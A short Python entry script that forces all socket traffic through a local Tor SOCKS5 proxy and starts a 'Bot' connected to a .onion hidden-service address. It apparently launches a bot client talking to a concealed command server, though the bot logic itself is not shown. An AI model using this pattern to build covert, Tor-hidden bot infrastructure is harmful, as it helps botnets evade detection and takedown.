'''
Created on Dec 20, 2013

@author: Onur
'''

import socket
import socks
from domain.TorHTTPClient import TorHTTPClient
from domain.Bot import Bot


def create_connection(address, timeout=None, source_address=None):
    sock = socks.socksocket()
    sock.connect(address)
    return sock

def monkey_patch_socket():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1",9050,True)
    socket.socket = socks.socksocket
    socket.create_connection = create_connection

if __name__ == "__main__":
    monkey_patch_socket()
    bot = Bot(TorHTTPClient('wauttqyou3q46aix.onion', 80))
    bot.activate()